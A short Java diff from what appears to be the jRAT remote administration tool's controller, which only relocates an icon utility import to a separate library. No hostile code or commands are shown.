@@ -1,5 +1,7 @@
 package se.jrat.controller.ui.panels;
 
+import iconlib.IconUtils;
+
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import java.io.BufferedReader;
@@ -20,7 +22,6 @@ import se.jrat.controller.ErrorDialog;
 import se.jrat.controller.Slave;
 import se.jrat.controller.packets.outgoing.Packet55HostsFile;
 import se.jrat.controller.packets.outgoing.Packet56UpdateHostsFile;
-import se.jrat.controller.utils.IconUtils;
 import se.jrat.controller.utils.Utils;
 
 import com.redpois0n.oslib.OperatingSystem;
